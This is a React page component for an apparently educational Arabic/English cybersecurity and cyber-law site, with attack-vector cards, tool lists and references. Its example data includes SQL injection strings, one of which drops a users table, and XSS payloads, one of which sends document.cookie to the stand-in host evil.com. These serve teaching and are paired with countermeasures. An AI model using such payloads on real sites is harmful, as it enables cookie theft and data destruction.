import React, { useEffect } from 'react';
import Navbar from '@/components/Navbar';
import Hero from '@/components/Hero';
import SectionContainer from '@/components/SectionContainer';
import ChapterSection from '@/components/ChapterSection';
import VoiceSearch from '@/components/VoiceSearch';
import { useLanguage } from '@/context/LanguageContext';
import { LanguageProvider } from '@/context/LanguageContext';
import { ExternalLink, ShieldAlert, Target, Binary, Database, User, Code, Lock, Download, BookOpen, Cpu, Eye, Server, UserCheck, AlertTriangle, Terminal } from 'lucide-react';
import CyberButton from '@/components/CyberButton';
import { Button } from '@/components/ui/button';
import ResourceCard from '@/components/ResourceCard';
import AttackVectorCard from '@/components/AttackVectorCard';
import HackingToolCard from '@/components/HackingToolCard';

const Index = () => {
  const { t, language } = useLanguage();

  useEffect(() => {
    const animateOnScroll = () => {
      const elements = document.querySelectorAll('.animate-on-scroll');
      elements.forEach(element => {
        const rect = element.getBoundingClientRect();
        const isVisible = (rect.top <= window.innerHeight * 0.8);
        
        if (isVisible) {
          element.classList.add('animate-fade-in');
          element.classList.remove('opacity-0', 'translate-y-8');
        }
      });
    };

    window.addEventListener('scroll', animateOnScroll);
    animateOnScroll(); // Initial check on load
    
    return () => window.removeEventListener('scroll', animateOnScroll);
  }, [language]);

  const chapter1Data = {
    id: 'chapter1',
    titleKey: 'chapter1.title',
    sections: [
      {
        id: 'chapter1-section1',
        titleKey: 'chapter1.section1.title',
        subtitleKey: 'chapter1.section1.subtitle',
        descriptionKey: 'chapter1.section1.p1',
        topics: [
          {
            titleKey: 'chapter1.section1.topic1.title',
            points: [
              'chapter1.section1.topic1.p1',
              'chapter1.section1.topic1.p2',
              'chapter1.section1.topic1.p3',
              'chapter1.section1.topic1.p4'
            ]
          },
          {
            titleKey: 'chapter1.section1.topic2.title',
            points: [
              'chapter1.section1.topic2.p1',
              'chapter1.section1.topic2.p2',
              'chapter1.section1.topic2.p3'
            ]
          }
        ]
      },
      {
        id: 'chapter1-section2',
        titleKey: 'chapter1.section2.title',
        subtitleKey: 'chapter1.section2.subtitle',
        descriptionKey: 'chapter1.section2.p1',
        topics: [
          {
            titleKey: 'chapter1.section2.topic1.title',
            points: [
              'chapter1.section2.topic1.p1',
              'chapter1.section2.topic1.p2',
              'chapter1.section2.topic1.p3',
              'chapter1.section2.topic1.p4'
            ]
          },
          {
            titleKey: 'chapter1.section2.topic2.title',
            points: [
              'chapter1.section2.topic2.p1',
              'chapter1.section2.topic2.p2',
              'chapter1.section2.topic2.p3',
              'chapter1.section2.topic2.p4'
            ]
          }
        ]
      }
    ]
  };

  const chapter2Data = {
    id: 'chapter2',
    titleKey: 'chapter2.title',
    sections: [
      {
        id: 'chapter2-section1',
        titleKey: 'chapter2.section1.title',
        subtitleKey: 'chapter2.section1.subtitle',
        descriptionKey: 'chapter2.section1.p1',
        topics: [
          {
            titleKey: 'chapter2.section1.topic1.title',
            points: [
              'chapter2.section1.topic1.p1',
              'chapter2.section1.topic1.p2',
              'chapter2.section1.topic1.p3',
              'chapter2.section1.topic1.p4'
            ]
          },
          {
            titleKey: 'chapter2.section1.topic2.title',
            points: [
              'chapter2.section1.topic2.p1',
              'chapter2.section1.topic2.p2',
              'chapter2.section1.topic2.p3',
              'chapter2.section1.topic2.p4'
            ]
          }
        ]
      },
      {
        id: 'chapter2-section2',
        titleKey: 'chapter2.section2.title',
        subtitleKey: 'chapter2.section2.subtitle',
        descriptionKey: 'chapter2.section2.p1',
        topics: [
          {
            titleKey: 'chapter2.section2.topic1.title',
            points: [
              'chapter2.section2.topic1.p1',
              'chapter2.section2.topic1.p2',
              'chapter2.section2.topic1.p3',
              'chapter2.section2.topic1.p4'
            ]
          },
          {
            titleKey: 'chapter2.section2.topic2.title',
            points: [
              'chapter2.section2.topic2.p1',
              'chapter2.section2.topic2.p2',
              'chapter2.section2.topic2.p3',
              'chapter2.section2.topic2.p4'
            ]
          }
        ]
      }
    ]
  };

  const referenceSources = {
    arabic: [
      {
        title: 'القانون رقم 18-07 المتعلق بحماية الأشخاص الطبيعيين في مجال معالجة المعطيات ذات الطابع الشخصي',
        url: 'https://www.joradp.dz/FTP/JO-ARABE/2018/A2018034.pdf'
      },
      {
        title: 'الأمن السيبراني وحماية المعلومات - د. محمد الألفي',
        url: 'https://books.google.com/books/about/الأمن_السيبراني_وحماية_المعلومات.html'
      },
      {
        title: 'قانون العقوبات الجزائري - المواد المتعلقة بالجرائم المعلوماتية',
        url: 'https://www.joradp.dz/trv/apenal.pdf'
      },
      {
        title: 'الأمن الرقمي والجرائم الإلكترونية - المجلة الجزائرية للدراسات القانونية',
        url: 'https://www.asjp.cerist.dz/en/article/97878'
      }
    ],
    international: [
      {
        title: 'NIST Cybersecurity Framework (2023)',
        url: 'https://www.nist.gov/cyberframework'
      },
      {
        title: 'Stuttard, D., & Pinto, M. (2021). The Web Application Hacker\'s Handbook: Finding and Exploiting Security Flaws',
        url: 'https://portswigger.net/web-security/web-application-hackers-handbook'
      },
      {
        title: 'Seitz, J. (2021). Black Hat Python: Python Programming for Hackers and Pentesters',
        url: 'https://nostarch.com/black-hat-python2E'
      },
      {
        title: 'SANS Institute (2022). Security Awareness Training Reports',
        url: 'https://www.sans.org/security-awareness-training/'
      },
      {
        title: 'European Union Agency for Cybersecurity (ENISA) Reports',
        url: 'https://www.enisa.europa.eu/publications'
      }
    ],
    online: [
      {
        title: 'OWASP Top 10 Web Application Security Risks',
        url: 'https://owasp.org/www-project-top-ten/'
      },
      {
        title: 'Kali Linux Documentation and Tools',
        url: 'https://www.kali.org/'
      },
      {
        title: 'Metasploit Framework Documentation',
        url: 'https://docs.metasploit.com/'
      },
      {
        title: 'Wireshark Network Analysis Guide',
        url: 'https://www.wireshark.org/docs/'
      },
      {
        title: 'Kaspersky Global Research and Analysis Team (GReAT) Reports',
        url: 'https://securelist.com/'
      },
      {
        title: 'Symantec Internet Security Threat Reports',
        url: 'https://www.broadcom.com/support/security-center'
      }
    ]
  };

  const latestThreats = [
    {
      title: "New Ransomware Strain Targeting Healthcare",
      date: "2023-05-12",
      severity: "High",
      description: "A sophisticated ransomware variant is specifically targeting healthcare institutions."
    },
    {
      title: "Critical Zero-day in Popular Web Framework",
      date: "2023-06-03",
      severity: "Critical",
      description: "Researchers discovered a remote code execution vulnerability affecting millions of websites."
    },
    {
      title: "Advanced Phishing Campaign Bypassing MFA",
      date: "2023-06-15",
      severity: "Medium",
      description: "New social engineering techniques are being used to bypass multi-factor authentication."
    },
    {
      title: "Supply Chain Attack on Open Source Libraries",
      date: "2023-07-02",
      severity: "High",
      description: "Malicious code was discovered in several popular open source packages."
    }
  ];

  const resourceBooks = [
    {
      title: "The Art of Human Hacking",
      author: "Chris Hadnagy",
      description: "A comprehensive guide to social engineering techniques and psychological manipulation.",
      imageUrl: "/images/book-social-engineering.jpg",
      downloadUrl: "https://archive.org/details/social-engineering-the-art-of-human-hacking",
      category: "Social Engineering",
      language: "English",
      pages: 416
    },
    {
      title: "Metasploit: The Penetration Tester's Guide",
      author: "David Kennedy",
      description: "Learn how to use the Metasploit Framework for penetration testing and vulnerability assessment.",
      imageUrl: "/images/book-metasploit.jpg",
      downloadUrl: "https://archive.org/details/metasploit-the-penetration-testers-guide",
      category: "Ethical Hacking",
      language: "English",
      pages: 328
    },
    {
      title: "Phishing Dark Waters",
      author: "Chris Hadnagy, Michele Fincher",
      description: "The offensive and defensive sides of malicious phishing campaigns.",
      imageUrl: "/images/book-phishing.jpg",
      downloadUrl: "https://archive.org/details/phishing-dark-waters",
      category: "Social Engineering",
      language: "English",
      pages: 288
    },
    {
      title: "القانون الجنائي الجزائري والجرائم الإلكترونية",
      author: "د. محمد عبد القادر",
      description: "تحليل شامل للقوانين الجزائرية المتعلقة بالجرائم الإلكترونية وتطبيقها.",
      imageUrl: "/images/book-algerian-cyber-law.jpg",
      downloadUrl: "https://archive.org/details/algerian-cyber-law",
      category: "Cyber Law",
      language: "Arabic",
      pages: 245
    }
  ];

  const detailedAttackVectors = [
    {
      id: "sql-injection",
      title: "SQL Injection",
      icon: Database,
      description: "A code injection technique used to attack data-driven applications by inserting malicious SQL statements.",
      technicalDetails: "SQL injection occurs when user-supplied data is not properly validated and directly included in SQL queries. Attackers can bypass authentication, access, modify, or delete data in a database.",
      examples: [
        "' OR 1=1 --",
        "admin' --",
        "UNION SELECT username,password FROM users--",
        "'; DROP TABLE users; --"
      ],
      countermeasures: [
        "Use parameterized queries",
        "Input validation",
        "Principle of least privilege",
        "Web Application Firewall (WAF)"
      ],
      tools: ["SQLmap", "NoSQLmap", "Havij"],
      severity: "High"
    },
    {
      id: "xss",
      title: "Cross-Site Scripting (XSS)",
      icon: Code,
      description: "A client-side code injection attack where malicious scripts are injected into websites visited by other users.",
      technicalDetails: "XSS attacks occur when data enters a web application through an untrusted source, most commonly a web request, and the data is included in dynamic content without proper validation.",
      examples: [
        "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
        "<img src=\"x\" onerror=\"alert(1)\">",
        "<body onload=\"alert('XSS')\">",
        "<iframe src=\"javascript:alert(`XSS`)\"></iframe>"
      ],
      countermeasures: [
        "Escape output",
        "Content Security Policy (CSP)",
        "HttpOnly cookies",
        "Input sanitization"
      ],
      tools: ["XSStrike", "XSSer", "BeEF (Browser Exploitation Framework)"],
      severity: "Medium"
    },
    {
      id: "social-engineering",
      title: "Social Engineering",
      icon: User,
      description: "Psychological manipulation of people into performing actions or divulging confidential information.",
      technicalDetails: "Social engineering attacks exploit human psychology rather than technical hacking techniques. Attackers use deception, manipulation, and influence to trick victims.",
      examples: [
        "Phishing emails impersonating trusted entities",
        "Pretexting (creating a fabricated scenario)",
        "Baiting (offering something enticing to swap)",
        "Tailgating (following someone into a secured area)"
      ],
      countermeasures: [
        "Security awareness training",
        "Multi-factor authentication",
        "Verification procedures",
        "Zero-trust security model"
      ],
      tools: ["Social-Engineer Toolkit (SET)", "GoPhish", "SocialFish"],
      severity: "High"
    },
    {
      id: "ai-threats",
      title: "AI-Assisted Attacks",
      icon: Cpu,
      description: "Leveraging artificial intelligence to enhance attack capabilities and bypass security controls.",
      technicalDetails: "AI technologies can be weaponized to increase the scale, speed, and effectiveness of cyberattacks. Techniques include generative AI for targeted phishing, deepfakes, automated vulnerability discovery, and adversarial machine learning.",
      examples: [
        "GPT-generated spear phishing emails",
        "Voice cloning for vishing (voice phishing) attacks",
        "AI-powered password cracking",
        "Deepfake video creation for executive impersonation"
      ],
      countermeasures: [
        "AI-based threat detection",
        "Deepfake detection tools",
        "Out-of-band verification",
        "Zero-trust authentication"
      ],
      tools: ["DeepFaceLab", "Real-Time Voice Cloning", "GPT models", "Adversarial machine learning frameworks"],
      severity: "Critical"
    },
    {
      id: "zero-day",
      title: "Zero-Day Exploits",
      icon: AlertTriangle,
      description: "Attacking software vulnerabilities unknown to the vendor and for which no patch exists.",
      technicalDetails: "Zero-day vulnerabilities represent a window of exposure from the time the vulnerability is discovered until a patch is released. Attackers use techniques like fuzzing, reverse engineering, and code analysis to discover these vulnerabilities.",
      examples: [
        "EternalBlue (MS17-010) before the patch",
        "Log4Shell vulnerability (CVE-2021-44228)",
        "Heartbleed in OpenSSL (CVE-2014-0160)",
        "SolarWinds supply chain attack"
      ],
      countermeasures: [
        "Virtual patching",
        "Defense in depth",
        "Behavior-based security monitoring",
        "Network segmentation"
      ],
      tools: ["Fuzzing frameworks (AFL, LibFuzzer)", "IDA Pro", "Binary Ninja", "Ghidra"],
      severity: "Critical"
    },
    {
      id: "iot-hacking",
      title: "IoT Hacking",
      icon: Server,
      description: "Exploiting vulnerabilities in Internet of Things devices to gain unauthorized access or control.",
      technicalDetails: "IoT devices often have weak security implementations due to resource constraints, legacy protocols, or poor design. Common attack vectors include default credentials, unpatched firmware, and insecure APIs.",
      examples: [
        "Mirai botnet targeting default credentials",
        "MQTT protocol exploitation",
        "Firmware extraction and analysis",
        "ZigBee/Z-Wave protocol vulnerabilities"
      ],
      countermeasures: [
        "Network segmentation for IoT devices",
        "Regular firmware updates",
        "Strong authentication",
        "Disable unnecessary services"
      ],
      tools: ["Shodan", "Foren6", "RFCrack", "Attify Framework"],
      severity: "High"
    }
  ];

  const hackingTools = [
    {
      name: "Kali Linux",
      category: "Operating System",
      description: "Security-focused Linux distribution with hundreds of pre-installed penetration testing tools.",
      icon: Terminal,
      url: "https://www.kali.org/",
      complexity: "Medium",
      usage: "Comprehensive platform for ethical hacking and security assessments"
    },
    {
      name: "Metasploit Framework",
      category: "Exploitation",
      description: "Advanced open-source platform for developing, testing, and executing exploits.",
      icon: Code,
      url: "https://www.metasploit.com/",
      complexity: "High",
      usage: "Vulnerability exploitation, payload generation, and post-exploitation"
    },
    {
      name: "Wireshark",
      category: "Network Analysis",
      description: "Network protocol analyzer for capturing and interactively browsing network traffic.",
      icon: Eye,
      url: "https://www.wireshark.org/",
      complexity: "Medium",
      usage: "Network troubleshooting, analysis, and security assessments"
    },
    {
      name: "Burp Suite",
      category: "Web Application",
      description: "Integrated platform for performing security testing of web applications.",
      icon: Target,
      url: "https://portswigger.net/burp",
      complexity: "Medium",
      usage: "Web vulnerability scanning, interception proxy, and request manipulation"
    },
    {
      name: "John the Ripper",
      category: "Password Cracking",
      description: "Fast password cracker for Unix/Linux and Windows users.",
      icon: Lock,
      url: "https://www.openwall.com/john/",
      complexity: "Medium",
      usage: "Password auditing and recovery"
    },
    {
      name: "SET (Social-Engineer Toolkit)",
      category: "Social Engineering",
      description: "Open-source penetration testing framework designed for social engineering attacks.",
      icon: UserCheck,
      url: "https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/",
      complexity: "Medium",
      usage: "Phishing campaigns, credential harvesting, and social engineering attacks"
    }
  ];

  return (
    <div className="min-h-screen bg-cyber-dark overflow-x-hidden binary-bg">
      <Navbar />
      <Hero />

      {/* Introduction Section */}
      <SectionContainer id="introduction" className="grid-bg">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-16 animate-on-scroll opacity-0 translate-y-8">
            <h2 className="cyber-heading text-gradient mb-4">{t('intro.title')}</h2>
            <p className="text-xl text-white/70">{t('intro.subtitle')}</p>
          </div>
          
          <div className="space-y-6 cyber-card p-8 rounded-2xl animate-on-scroll opacity-0 translate-y-8">
            <p className="text-white/80 leading-relaxed">{t('intro.p1')}</p>
            <p className="text-white/80 leading-relaxed">{t('intro.p2')}</p>
            <p className="text-white/80 leading-relaxed">{t('intro.p3')}</p>
            
            <div className="mt-8 bg-cyber-darker p-4 rounded-md border border-cyber-accent/20 font-mono text-sm overflow-hidden">
              <div className="flex items-center mb-2 text-white/60 text-xs">
                <div className="w-3 h-3 rounded-full bg-red-500 mr-2"></div>
                <div className="w-3 h-3 rounded-full bg-yellow-500 mr-2"></div>
                <div className="w-3 h-3 rounded-full bg-green-500 mr-2"></div>
                <span>terminal@cybersec ~ </span>
              </div>
              <div className="hacking-animation text-cyber-accent">
                $ nmap -p 1-1000 -T4 -A -v target.com
              </div>
              <p className="text-white/50 mt-3">Scanning for open ports and vulnerabilities...</p>
              <p className="text-white/50">Discovered potential security weaknesses...</p>
            </div>
          </div>

          <div className="mt-16 animate-on-scroll opacity-0 translate-y-8">
            <div className="flex items-center mb-6">
              <ShieldAlert className="text-red-400 mr-2" />
              <h3 className="text-xl text-gradient font-medium">{t('securityFeed.title')}</h3>
            </div>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {latestThreats.map((threat, index) => (
                <div key={index} className="cyber-card p-4 rounded-lg text-white/80">
                  <div className="flex justify-between items-start mb-2">
                    <h4 className="text-white font-medium">{threat.title}</h4>
                    <span className={`px-2 py-0.5 rounded text-xs ${
                      threat.severity === "Critical" ? "bg-red-900/50 text-red-200" :
                      threat.severity === "High" ? "bg-orange-900/50 text-orange-200" :
                      "bg-yellow-900/50 text-yellow-200"
                    }`}>
                      {threat.severity}
                    </span>
                  </div>
                  <p className="text-xs text-white/50 mb-2">{threat.date}</p>
                  <p className="text-sm">{threat.description}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      </SectionContainer>

      {/* Voice Search Section */}
      <SectionContainer id="voice-search" className="bg-cyber-darker">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-12 animate-on-scroll opacity-0 translate-y-8">
            <h2 className="cyber-heading text-gradient mb-4">
              {language === 'ar' ? 'مساعدك الصوتي في الأمن السيبراني' : 'Your Cybersecurity Voice Assistant'}
            </h2>
            <p className="text-xl text-white/70">
              {language === 'ar' ? 'تحدث مع المساعد للحصول على معلومات حول الأمن السيبراني والقوانين ذات الصلة' : 'Speak to the assistant for information about cybersecurity and related laws'}
            </p>
          </div>
          
          <div className="animate-on-scroll opacity-0 translate-y-8">
            <VoiceSearch />
          </div>
        </div>
      </SectionContainer>

      {/* Chapter 1: Hacking Strategies */}
      <ChapterSection {...chapter1Data} />

      {/* Enhanced Attack Vectors Section */}
      <SectionContainer id="attack-vectors" className="bg-cyber-darker">
        <div className="max-w-5xl mx-auto">
          <div className="text-center mb-12 animate-on-scroll opacity-0 translate-y-8">
            <h2 className="cyber-heading text-gradient mb-4">{t('attackVectors.title')}</h2>
            <p className="text-xl text-white/70">{t('attackVectors.subtitle')}</p>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-10">
            {detailedAttackVectors.slice(0, 3).map((vector) => (
              <AttackVectorCard key={vector.id} attackVector={vector} />
            ))}
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 animate-on-scroll opacity-0 translate-y-8">
            {detailedAttackVectors.slice(3, 6).map((vector) => (
              <AttackVectorCard key={vector.id} attackVector={vector} />
            ))}
          </div>
        </div>
      </SectionContainer>

      {/* Chapter 2: Legal Framework */}
      <ChapterSection {...chapter2Data} />

      {/* New Section: Hacker Toolkit */}
      <SectionContainer id="hacking-tools" className="bg-cyber-darker">
        <div className="max-w-5xl mx-auto">
          <div className="text-center mb-12 animate-on-scroll opacity-0 translate-y-8">
            <h2 className="cyber-heading text-gradient mb-4">{t('hackingTools.title') || "Hacker's Toolkit"}</h2>
            <p className="text-xl text-white/70">{t('hackingTools.subtitle') || "Professional tools used by security researchers and ethical hackers"}</p>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 animate-on-scroll opacity-0 translate-y-8">
            {hackingTools.map((tool, index) => (
              <HackingToolCard key={index} tool={tool} />
            ))}
          </div>
          
          <div className="mt-10 text-center">
            <p className="text-white/70 mb-4">{t('hackingTools.disclaimer') || "Important: These tools should only be used for legal and ethical purposes such as security research, penetration testing with permission, and educational purposes."}</p>
          </div>
        </div>
      </SectionContainer>

      {/* New Section: Free Resources */}
      <SectionContainer id="resources">
        <div className="max-w-5xl mx-auto">
          <div className="text-center mb-12 animate-on-scroll opacity-0 translate-y-8">
            <h2 className="cyber-heading text-gradient mb-4">{t('resources.title') || "Curated Resources"}</h2>
            <p className="text-xl text-white/70">{t('resources.subtitle') || "Free educational materials to deepen your cybersecurity knowledge"}</p>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 animate-on-scroll opacity-0 translate-y-8">
            {resourceBooks.map((book, index) => (
              <ResourceCard key={index} resource={book} />
            ))}
          </div>
          
          <div className="mt-10 text-center animate-on-scroll opacity-0 translate-y-8">
            <div className="cyber-card p-6 rounded-xl">
              <div className="flex items-center justify-center mb-4">
                <BookOpen className="text-cyber-accent h-6 w-6 mr-2" />
                <h3 className="text-xl text-white">{t('resources.legalNotice') || "Legal Notice"}</h3>
              </div>
              <p className="text-white/70">
                {t('resources.legalNoticeText') || "The resources provided are for educational purposes only. The books linked are available through Archive.org and other legal platforms under fair use or open access policies. If you are the copyright holder of any material and believe it has been incorrectly shared, please contact us for immediate removal."}
              </p>
            </div>
          </div>
        </div>
      </SectionContainer>

      {/* Defense Strategies */}
      <SectionContainer id="defense-strategies">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-12 animate-on-scroll opacity-0 translate-y-8">
            <h2 className="cyber-heading text-gradient mb-4">{t('defenseStrategies.title')}</h2>
            <p className="text-xl text-white/70">{t('defenseStrategies.subtitle')}</p>
          </div>
          
          <div className="cyber-card p-8 rounded-2xl animate-on-scroll opacity-0 translate-y-8">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              <div>
                <div className="flex items-center mb-4">
                  <Lock className="text-cyber-accent mr-3" />
                  <h3 className="text-xl font-medium">{t('defenseStrategies.technicalTitle')}</h3>
                </div>
                <ul className="space-y-3 text-white/80">
                  <li className="flex items-start">
                    <div className="h-6 w-6 rounded-full bg-cyber-accent/20 flex items-center justify-center text-cyber-accent mr-2 mt-0.5">1</div>
                    <p>{t('defenseStrategies.technical1')}</p>
                  </li>
                  <li className="flex items-start">
                    <div className="h-6 w-6 rounded-full bg-cyber-accent/20 flex items-center justify-center text-cyber-accent mr-2 mt-0.5">2</div>
                    <p>{t('defenseStrategies.technical2')}</p>
                  </li>
                  <li className="flex items-start">
                    <div className="h-6 w-6 rounded-full bg-cyber-accent/20 flex items-center justify-center text-cyber-accent mr-2 mt-0.5">3</div>
                    <p>{t('defenseStrategies.technical3')}</p>
                  </li>
                </ul>
              </div>
              
              <div>
                <div className="flex items-center mb-4">
                  <ShieldAlert className="text-cyber-accent mr-3" />
                  <h3 className="text-xl font-medium">{t('defenseStrategies.legalTitle')}</h3>
                </div>
                <ul className="space-y-3 text-white/80">
                  <li className="flex items-start">
                    <div className="h-6 w-6 rounded-full bg-cyber-accent/20 flex items-center justify-center text-cyber-accent mr-2 mt-0.5">1</div>
                    <p>{t('defenseStrategies.legal1')}</p>
                  </li>
                  <li className="flex items-start">
                    <div className="h-6 w-6 rounded-full bg-cyber-accent/20 flex items-center justify-center text-cyber-accent mr-2 mt-0.5">2</div>
                    <p>{t('defenseStrategies.legal2')}</p>
                  </li>
                  <li className="flex items-start">
                    <div className="h-6 w-6 rounded-full bg-cyber-accent/20 flex items-center justify-center text-cyber-accent mr-2 mt-0.5">3</div>
                    <p>{t('defenseStrategies.legal3')}</p>
                  </li>
                </ul>
              </div>
            </div>
            
            <div className="mt-8 pt-8 border-t border-white/10">
              <div className="sidebar-glow">
                <h4 className="text-lg font-medium text-white mb-4">{t('defenseStrategies.bestPracticesTitle')}</h4>
                <p className="text-white/80 mb-4">{t('defenseStrategies.bestPracticesDesc')}</p>
                <Button className="cyber-btn-glow mt-2">
                  {t('defenseStrategies.downloadGuide')}
                </Button>
              </div>
            </div>
          </div>
        </div>
      </SectionContainer>

      {/* Conclusion Section */}
      <SectionContainer id="conclusion" className="bg-cyber-darker">
        <div className="max-w-4xl mx-auto text-center space-y-16">
          <div className="animate-on-scroll opacity-0 translate-y-8">
            <h2 className="cyber-heading text-gradient mb-4">{t('conclusion.title')}</h2>
            <p className="text-xl text-white/70 mb-8">{t('conclusion.subtitle')}</p>
          </div>
          
          <div className="cyber-card p-8 rounded-2xl animate-on-scroll opacity-0 translate-y-8 text-left">
            <div className="space-y-6">
              <p className="text-white/80 leading-relaxed">{t('conclusion.p1')}</p>
              <p className="text-white/80 leading-relaxed">{t('conclusion.p2')}</p>
              <p className="text-white/80 leading-relaxed">{t('conclusion.p3')}</p>
              <p className="text-white/80 leading-relaxed">{t('conclusion.p4')}</p>
            </div>
          </div>
        </div>
      </SectionContainer>

      {/* References Section with Clickable Links */}
      <SectionContainer id="references">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-16 animate-on-scroll opacity-0 translate-y-8">
            <h2 className="cyber-heading text-gradient mb-4">{t('references.title')}</h2>
            <p className="text-xl text-white/70">{t('references.subtitle')}</p>
          </div>
          
          <div className="space-y-12">
            <div className="cyber-card p-8 rounded-2xl animate-on-scroll opacity-0 translate-y-8">
              <h3 className="text-white mb-6 pb-3 border-b border-white/10">{t('references.arabic')}</h3>
              <ul className="list-disc list-inside space-y-3 text-white/80">
                {referenceSources.arabic.map((source, index) => (
                  <li key={`arabic-${index}`}>
                    <a href={source.url} target="_blank" rel="noopener noreferrer" className="source-link">
                      {source.title}
                    </a>
                  </li>
                ))}
              </ul>
            </div>
            
            <div className="cyber-card p-8 rounded-2xl animate-on-scroll opacity-0 translate-y-8">
              <h3 className="text-white mb-6 pb-3 border-b border-white/10">{t('references.international')}</h3>
              <ul className="list-disc list-inside space-y-3 text-white/80">
                {referenceSources.international.map((source, index) => (
                  <li key={`international-${index}`}>
                    <a href={source.url} target="_blank" rel="noopener noreferrer" className="source-link">
                      {source.title}
                    </a>
                  </li>
                ))}
              </ul>
            </div>
            
            <div className="cyber-card p-8 rounded-2xl animate-on-scroll opacity-0 translate-y-8">
              <h3 className="text-white mb-6 pb-3 border-b border-white/10">{t('references.online')}</h3>
              <ul className="list-disc list-inside space-y-3 text-white/80">
                {referenceSources.online.map((source, index) => (
                  <li key={`online-${index}`}>
                    <a href={source.url} target="_blank" rel="noopener noreferrer" className="source-link">
                      {source.title}
                    </a>
                  </li>
                ))}
              </ul>
            </div>
          </div>
          
          <div className="mt-12 cyber-card p-6 rounded-xl animate-on-scroll opacity-0 translate-y-8">
            <h4 className="neon-text mb-4">{t('references.citationTitle')}</h4>
            <p className="text-white/80 text-sm">{t('references.citationDesc')}</p>
          </div>
        </div>
      </SectionContainer>

      <footer className="py-10 border-t border-white/10 bg-cyber-darker">
        <div className="container mx-auto px-4 text-center">
          <p className="text-white/60 text-sm">
            &copy; 2023 {t('footer.rights')} • {t('footer.disclaimer')}
          </p>
          <div className="flex justify-center mt-4 space-x-4">
            <a href="#introduction" className="cyber-link text-sm">
              {t('footer.intro')}
            </a>
            <a href="#chapter1" className="cyber-link text-sm">
              {t('footer.hacking')}
            </a>
            <a href="#chapter2" className="cyber-link text-sm">
              {t('footer.legal')}
            </a>
            <a href="#references" className="cyber-link text-sm">
              {t('footer.references')}
            </a>
          </div>
        </div>
      </footer>
    </div>
  );
};

const IndexWithLanguage = () => {
  return (
    <LanguageProvider>
      <Index />
    </LanguageProvider>
  );
};

export default IndexWithLanguage;
